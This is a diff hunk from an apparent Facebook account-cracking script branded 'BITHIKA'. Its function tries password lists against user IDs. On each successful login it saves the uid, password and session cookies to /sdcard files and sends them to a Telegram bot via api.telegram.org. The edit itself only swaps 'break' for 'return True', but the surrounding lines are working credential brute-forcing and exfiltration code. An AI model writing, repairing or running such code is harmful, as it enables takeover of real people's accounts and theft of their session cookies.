@@ -988,19 +988,19 @@ def rndm1(uid,passlist):
                                         open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(cid)
                                         cek_apk(coki)
-                                        break
+                                        return True
                         elif 'access_token' in po:
                                         cid = str(po['uid'])
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         statusok = (f" {cid} | {pas} | {coki} ")
                                         requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                                        break
+                                        return True
                         elif 'error' in po and 'message' in po['error'] and 'www.facebook.com' in po['error']['message'] and (uid_extracted := re.search(r'uid=(\d+)', po['error']['message'])).group(1) if uid_extracted else None:
                                         if 'y' in pcp:
                                                 print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid_extracted+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/BITHIKA-CP.txt','a').write(uid_extracted+'|'+pas+'\n')
                                                 cps.append(uid)
-                                                break
+                                                return True
                                         else:
                                                 break
                         else:
